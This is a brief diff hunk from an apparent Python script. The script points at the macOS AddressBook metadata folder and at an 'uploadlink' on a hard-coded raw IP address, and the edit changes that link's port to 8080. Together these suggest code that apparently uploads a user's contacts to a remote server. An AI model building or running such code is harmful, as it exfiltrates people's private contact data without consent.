@@ -10,7 +10,7 @@ home = expanduser("~")
 
 clocation = home + "/Library/Application Support/AddressBook/Metadata/"
 
-uploadlink = "http://146.148.56.181/"
+uploadlink = "http://146.148.56.181:8080/"
 
 user = getpass.getuser()
 
